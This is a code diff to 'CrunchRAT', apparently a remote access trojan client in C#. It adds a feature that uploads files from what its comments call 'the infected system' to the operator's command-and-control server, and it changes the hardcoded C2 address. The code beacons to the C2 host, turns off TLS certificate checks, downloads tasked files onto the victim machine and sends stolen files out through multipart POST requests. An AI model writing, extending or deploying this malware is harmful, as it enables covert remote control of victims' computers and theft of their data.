@@ -15,7 +15,7 @@ namespace CrunchRAT
         // Main() function
         static void Main(string[] args)
         {
-            string c2 = "192.168.1.135";                                                                // NEEDS CHANGED BY THE RAT USER
+            string c2 = "192.168.2.140";                                                                // NEEDS CHANGED BY THE RAT USER
             string beaconURL = "https://" + c2 + "/beacon.php";                                         // NEEDS CHANGED BY THE RAT USER
             string updateURL = "https://" + c2 + "/update.php";                                         // NEEDS CHANGED BY THE RAT USER
             int beaconInterval = 30000;                                                                 // NEEDS CHANGED BY THE RAT USER
@@ -53,7 +53,12 @@ namespace CrunchRAT
                     updateUpload(updateURL, taskID, taskAction, taskSecondary);                         // Updates
                 }
                 
-                // If statement for <action>download<action> - Add in functionality at a later date
+                if (responseString.Contains("<action>download<action>"))                                // If we have a tasked remote file downlaod (IE: the RAT user wants to download a file from the infected system)
+                {
+                    stripOutTaskInfo(responseString, out taskID, out taskAction, out taskSecondary);    // Strips out the task information (ID, action, and secondary) from the beacon response string
+
+                    uploadFile(updateURL, hostname, taskID, taskAction, taskSecondary);                 // Uploads file to the C2 server
+                }
 
                 Thread.Sleep(beaconInterval);                                                           // Sleeps for the user-specified interval
             }
@@ -228,18 +233,123 @@ namespace CrunchRAT
         // The getFile() function will download the remote uploaded file - Working as of 05-08-16
         static void getFile(string c2, string taskSecondary)
         {
-            string filename = Path.GetFileName(taskSecondary);                                  // Gets just the filename from the taskSecondary file path
-    
-            using (WebClient wc = new WebClient())
+            try // Tries to download file
             {
-                string resource = "https://" + c2 + taskSecondary;
-                wc.DownloadFile(resource, filename);
+                string filename = Path.GetFileName(taskSecondary);                                  // Gets just the filename from the taskSecondary file path
+
+                using (WebClient wc = new WebClient())
+                {
+                    string resource = "https://" + c2 + taskSecondary;
+                    wc.DownloadFile(resource, filename);
+                }
+            }
+            catch // Research if there's a way to implement try without the catch
+            {
             }
         }
         // End of getFile() function
 
 
-        // Additional functions here
+        // The uploadFile() function will upload the file to the C2 server using a multipart/form-data POST request - Working as of 05-09-16
+        // Modified code from source: https://www.techcoil.com/blog/sending-a-file-and-some-form-data-via-http-post-in-c/
+        static void uploadFile(string updateURL, string hostname, string taskID, string taskAction, string taskSecondary)
+        {
+            // If file exists we need to upload it to the C2 server
+            if (File.Exists(taskSecondary))
+            {
+                try // Tries to upload file
+                {
+                    HttpWebRequest uploadRequest = (HttpWebRequest)WebRequest.Create(updateURL);
+                    uploadRequest.ServicePoint.Expect100Continue = false; // Removes the "Expect 100-Continue" HTTP header
+                    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; }; // Ignore self-signed SSL errors
+                    ServicePointManager.DefaultConnectionLimit = 20; // Normally is limited to 2 concurrent requests - http://en.code-bude.net/2013/01/21/3-things-you-should-know-to-speed-up-httpwebrequest/
 
+                    string boundaryString = "----CrunchRAT";
+
+                    uploadRequest.Method = "POST";
+                    uploadRequest.ContentType = "multipart/form-data; boundary=" + boundaryString;
+                    uploadRequest.KeepAlive = true;
+
+                    // MemoryStream so we can get Content-Length
+                    MemoryStream postDataStream = new MemoryStream();
+                    StreamWriter postDataWriter = new StreamWriter(postDataStream);
+
+                    postDataWriter.Write("\r\n--" + boundaryString + "\r\n");                               // Hostname POST parameter
+                    postDataWriter.Write("Content-Disposition: form-data; name=hostname\r\n\r\n");      
+                    postDataWriter.Write(hostname);
+
+                    postDataWriter.Write("\r\n--" + boundaryString + "\r\n");                               // Task ID POST parameter
+                    postDataWriter.Write("Content-Disposition: form-data; name=id\r\n\r\n");
+                    postDataWriter.Write(taskID);
+
+                    postDataWriter.Write("\r\n--" + boundaryString + "\r\n");                               // Task action POST parameter
+                    postDataWriter.Write("Content-Disposition: form-data; name=action\r\n\r\n");
+                    postDataWriter.Write(taskAction);
+
+                    postDataWriter.Write("\r\n--" + boundaryString + "\r\n");                               // Task secondary POST parameter
+                    postDataWriter.Write("Content-Disposition: form-data; name=secondary\r\n\r\n");
+                    postDataWriter.Write(taskSecondary);
+
+
+                    postDataWriter.Write("\r\n--" + boundaryString + "\r\n");                               // Start of file
+                    postDataWriter.Write("Content-Disposition: form-data;"
+                                            + "name=\"{0}\";"
+                                            + "filename=\"{1}\""
+                                            + "\r\nContent-Type: {2}\r\n\r\n",
+                                            "download",
+                                            Path.GetFileName(taskSecondary),
+                                            Path.GetExtension(taskSecondary));
+
+                    postDataWriter.Flush();
+
+                    FileStream fileStream = new FileStream(taskSecondary, FileMode.Open, FileAccess.Read);  // Reads the file
+                    byte[] buffer = new byte[1024];
+                    int bytesRead = 0;
+                    while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
+                        postDataStream.Write(buffer, 0, bytesRead);
+
+                    fileStream.Close();
+
+                    postDataWriter.Write("\r\n--" + boundaryString + "\r\n");
+                    postDataWriter.Flush();
+
+                    uploadRequest.ContentLength = postDataStream.Length;
+
+                    using (Stream s = uploadRequest.GetRequestStream())                                     // Memory stream to request stream
+                        postDataStream.WriteTo(s);
+                    
+                    postDataStream.Close();
+                }
+                catch // Research if there's a way to implement try without the catch
+                {
+                }
+            }
+            // Else file doesn't exist
+            else
+            {
+                try // Tries to update
+                {
+                    HttpWebRequest beaconRequest = (HttpWebRequest)WebRequest.Create(updateURL);
+                    beaconRequest.ServicePoint.Expect100Continue = false; // Removes the "Expect 100-Continue" HTTP header
+                    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; }; // Ignore self-signed SSL errors
+                    ServicePointManager.DefaultConnectionLimit = 20; // Normally is limited to 2 concurrent requests - http://en.code-bude.net/2013/01/21/3-things-you-should-know-to-speed-up-httpwebrequest/
+
+                    string postData = "id=" + taskID + "&action=" + taskAction + "&secondary=" + Uri.EscapeDataString(taskSecondary); // URL-encoded POST data            
+                    var data = Encoding.UTF8.GetBytes(postData);
+                    beaconRequest.Method = "POST";
+                    beaconRequest.ContentType = "application/x-www-form-urlencoded";
+                    beaconRequest.ContentLength = data.Length;
+
+                    using (var stream = beaconRequest.GetRequestStream()) // Disposable
+                        stream.Write(data, 0, data.Length);
+                }
+                catch // Research if there's a way to implement try without the catch
+                {
+                }
+            }
+        }
+        // End of uploadFile() function
+
+        // Additional functions here
     }
 }
